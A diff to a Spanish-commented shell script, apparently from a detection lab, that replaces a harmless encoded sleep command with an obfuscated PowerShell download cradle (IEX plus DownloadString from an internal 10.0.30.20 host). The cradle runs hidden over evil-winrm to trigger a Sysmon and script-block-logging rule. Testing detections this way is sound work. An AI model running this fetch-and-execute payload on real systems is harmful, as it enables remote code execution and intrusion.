@@ -18,7 +18,18 @@ read -rsp "Password WinRM: " WP; echo
 # nombre de usuario y la autenticacion falla con WinRMAuthorizationError
 # (aunque las credenciales sean validas). Se convierte '/' -> '\'.
 WU="${WU//\//\\}"
-CMD='powershell -nop -w hidden -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQA='
+# Payload REALISTA tipo "download cradle" (T1059.001): PowerShell ofuscado con
+# -EncodedCommand que, al decodificarse, descarga y ejecuta un script remoto
+# (IEX + Net.WebClient.DownloadString). No necesita que el servidor remoto
+# exista: la sola ejecucion deja (a) la linea de comando con -enc en Sysmon
+# Event 1 y (b) el bloque de script decodificado (IEX/DownloadString) en el
+# PowerShell Script Block Logging (Event 4104). Ambas evidencias disparan la
+# regla 100051. Es el comportamiento real de un payload malicioso, no un
+# placeholder inocuo.
+CRADLE="IEX (New-Object Net.WebClient).DownloadString('http://10.0.30.20:8000/update.ps1')"
+ENC=$(python3 -c "import base64,sys;print(base64.b64encode(sys.argv[1].encode('utf-16-le')).decode())" "$CRADLE" 2>/dev/null)
+[ -n "$ENC" ] || ENC='SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADMAMAAuADIAMAA6ADgAMAAwADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA='
+CMD="powershell -nop -w hidden -enc ${ENC}"
 LOGF="/tmp/payload_$(date +%s).log"
 # evil-winrm no tiene un flag para ejecutar un solo comando (-e es la ruta de
 # ejecutables C#, no un comando); es una shell interactiva, así que el
